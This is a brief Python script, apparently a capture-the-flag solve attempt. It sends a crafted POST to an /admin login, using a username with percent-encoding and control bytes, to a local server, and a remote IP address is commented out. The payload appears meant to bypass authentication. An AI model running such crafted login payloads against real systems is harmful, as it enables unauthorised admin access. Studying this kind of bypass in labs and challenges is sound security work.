import requests as re

# url = 'http://103.162.14.116:5002/admin'
url = 'http://127.0.0.1:5000/admin'

data = {
    b'username':b'%62hxa\x01\x01',
    'password':b'a'
}

res = re.post(url, data=data)
print(res.content)